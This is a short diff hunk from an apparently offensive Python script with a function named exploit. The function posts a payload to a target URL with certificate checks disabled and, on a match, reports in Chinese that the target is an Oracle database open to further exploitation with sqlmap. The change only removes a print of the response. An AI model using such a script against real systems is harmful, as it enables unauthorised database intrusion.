@@ -51,7 +51,6 @@ def exploit(url):
         res = requests.post(url=target, data=payload, headers=headers, verify=False, timeout=10)
         res.encoding = res.apparent_encoding
         if '[' in res.text:
-            print(res.text)
             print(now_time() + success() + '目标为oracle数据库, 可利用sqlmap进行进一步利用: {}'.format(target))
             return 'ok'
         else:
